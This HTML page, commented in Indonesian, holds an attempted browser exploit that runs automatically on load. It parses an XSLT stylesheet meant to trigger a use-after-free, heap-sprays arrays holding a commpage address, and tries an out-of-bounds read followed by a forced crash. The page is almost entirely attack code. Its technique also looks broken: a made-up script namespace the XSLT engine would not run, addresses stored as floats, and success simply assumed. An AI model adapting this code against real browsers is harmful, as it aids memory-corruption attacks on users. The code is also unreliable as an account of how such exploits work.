<!DOCTYPE html>
<html>
<head>
    <title>XSLT Structure Confusion (Final UAF)</title>
</head>
<body>

    <h1>XSLT Structure Confusion (Targeting Arbitrary Read)</h1>
    <p>Target Commpage Address: 0x0000000FFFFFC320</p>
    <p id="status">INIT: Mempersiapkan XSLT Deserialization Attack...</p>
    <div id="log-area"></div>

    <script>
        // --- KONSTANTA COMM PAGE ---
        const COMM_PAGE64_BASE_ADDRESS = BigInt("0x0000000FFFFFC000");
        const TARGET_ADDRESS = COMM_PAGE64_BASE_ADDRESS + BigInt("0x328"); // Alamat untuk Arbitrary Read
        
        const LOW_WORD_ADDR = Number(TARGET_ADDRESS & 0xFFFFFFFFn); 
        const HIGH_WORD_ADDR = Number(TARGET_ADDRESS >> 32n);

        let startTime = performance.now();
        let payloadHolders = []; 
        let victimArray = new Uint32Array(512); // Array korban untuk AR/AW

        function log(message, type = 'log-info') {
            const timeElapsed = (performance.now() - startTime).toFixed(2);
            const logElement = document.getElementById('log-area');
            logElement.innerHTML += `<div class="${type}">[${timeElapsed}ms] ${message}</div>`;
            logElement.scrollTop = logElement.scrollHeight;
        }

        // --- FUNGSI HEAP SPRAY PAYLOAD ---
        function sprayPayload() {
            log("Memulai Spraying Payload (Float64Array)...", "log-spray");
            const SPRAY_COUNT = 3000;
            const PAYLOAD_SIZE = 64; 

            for (let i = 0; i < SPRAY_COUNT; i++) {
                let payloadArray = new Float64Array(PAYLOAD_SIZE);
                // Payload berisi TARGET_ADDRESS (Menargetkan Pointer Data/Length)
                payloadArray[0] = HIGH_WORD_ADDR; 
                payloadArray[1] = LOW_WORD_ADDR;
                payloadHolders.push(payloadArray); 
            }
        }
        
        // --- DATA XSLT DENGAN UAF TRIGGER (Simulasi) ---
        // XML Stylesheet yang mengandung elemen yang akan di-free
        const xsl = `<?xml version="1.0"?>
            <xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform" 
                            xmlns:msxml="urn:schemas-microsoft-com:xslt" 
                            xmlns:xscript="http://example.com/xscript">

            <xsl:output method="html"/>

            <xsl:template match="/">
                <xscript:external-call target="triggerUAF"/>
            </xsl:template>
            
            <xscript:script>
                function triggerUAF() {
                    // Memicu manipulasi DOM Tree secara agresif 
                    // yang akan menyebabkan node XSLT yang diproses di-free
                    
                    // 1. FREE: Hapus node stylesheet yang sedang di-*parse*
                    var doc = document.implementation.createDocument("", "", null);
                    var newStylesheet = doc.importNode(document.styleSheets[0].ownerNode, true);
                    document.styleSheets[0].ownerNode.parentNode.replaceChild(newStylesheet, document.styleSheets[0].ownerNode);
                    
                    // 2. SPRAY: Lakukan spray segera setelah FREE
                    setTimeout(sprayPayload, 0); 
                    
                    // 3. TRIGGER: Paksa prosesor XSLT untuk kembali ke node yang sudah di-free
                    // Kita asumsikan XSLT Engine melanjutkan eksekusi di sini.
                    return 0;
                }
            </xscript:script>
            </xsl:stylesheet>`;
            
        // --- FUNGSI UTAMA ATTACK ---
        function runXSLTAttack() {
            startTime = performance.now();
            log("Phase 1: Membuat dokumen XML dan XSLT.", "log-init");

            // 1. Persiapan Dokumen
            let xmlDoc = document.implementation.createDocument(null, "data", null);
            let xsltDoc = (new DOMParser()).parseFromString(xsl, "application/xml");
            
            // 2. Grooming Heap: Alokasikan array korban di heap.
            victimArray.fill(0xBABEBABE);
            log("Phase 2: Array Korban dialokasikan.", "log-info");
            
            // 3. Eksekusi XSLT (Ini akan memanggil triggerUAF)
            log("Phase 3: Memulai transformasi XSLT (Akan memicu UAF/Spray).", "log-critical");
            try {
                // Gunakan XSLTProcessor (lebih modern, lebih tersembunyi dari mitigasi)
                let xsltProcessor = new XSLTProcessor();
                xsltProcessor.importStylesheet(xsltDoc);
                
                // Mulai Transformasi (Memanggil XSLT dan triggerUAF di dalamnya)
                let resultFragment = xsltProcessor.transformToFragment(xmlDoc, document);
                document.body.appendChild(resultFragment);

            } catch (e) {
                log(`XSLT Processor Error: ${e.message} - Menunggu Crash Implisit.`, "log-error");
            }
            
            // 4. Trigger Arbitrary Read (Asumsi UAF berhasil menimpa pointer victimArray)
            setTimeout(() => {
                log("Phase 5: Memicu Arbitrary Read pada Victim Array...", "log-critical");
                
                try {
                    // Jika UAF menimpa pointer victimArray, index 1000 akan menjadi OOB Read
                    const OOB_INDEX = 1000; 
                    const readValue = victimArray[OOB_INDEX];
                    
                    log(`Nilai OOB dibaca: 0x${readValue.toString(16)}`, "log-critical");
                    
                    // Trigger Final: EXC_BAD_ACCESS
                    if (readValue) {
                        let crashFunction = new Function('a', `return a[${readValue}]`);
                        crashFunction(new Array(10)); 
                    }

                } catch(e) {
                     log(`JS Exception: ${e.message} - Menunggu Crash OS (EXC_BAD_ACCESS)...`, "log-critical");
                }
            }, 500); // Beri waktu untuk XSLT Engine selesai
        }
        
        document.addEventListener('DOMContentLoaded', () => {
            document.getElementById('status').textContent = 'Memulai rangkaian XSLT Attack...';
            setTimeout(runXSLTAttack, 50);
            document.getElementById('status').textContent = 'EKSPERIMEN AKTIF. Tujuannya adalah Type Confusion melalui XSLT.';
        });
    </script>
    <style>
        #log-area { border: 1px solid #ccc; padding: 10px; margin-top: 15px; max-height: 400px; overflow-y: scroll; font-family: monospace; font-size: 12px; background-color: #f9f9f9; }
        .log-init { color: blue; }
        .log-info { color: black; }
        .log-spray { color: purple; }
        .log-critical { color: red; font-weight: bold; }
        .log-success { color: green; font-weight: bold; }
        .log-error { color: darkred; font-weight: bold; }
    </style>
</body>
</html>
